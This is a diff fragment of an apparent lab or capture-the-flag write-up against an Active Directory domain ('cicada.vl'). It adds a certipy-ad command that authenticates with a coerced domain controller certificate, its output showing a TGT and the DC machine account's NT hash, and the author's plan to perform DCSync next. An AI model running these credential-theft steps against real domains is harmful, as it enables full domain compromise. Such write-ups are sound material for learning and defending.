@@ -356,5 +356,19 @@ This coerced the DC machine account to connect to NTLMrelayX then send the auth 
 Now i have a certificate i can extract a NTLM hash from
 
 ```python
+certipy-ad auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.234.48                    
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
+[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
+[*] Using principal: 'dc-jpq225$@cicada.vl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc-jpq225.ccache'
+[*] Wrote credential cache to 'dc-jpq225.ccache'
+[*] Trying to retrieve NT hash for 'dc-jpq225$'
+[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
 ```
+I now have a hash and a ccache for the DC machine account so now i should be able to abuse a DCSync attack!
+
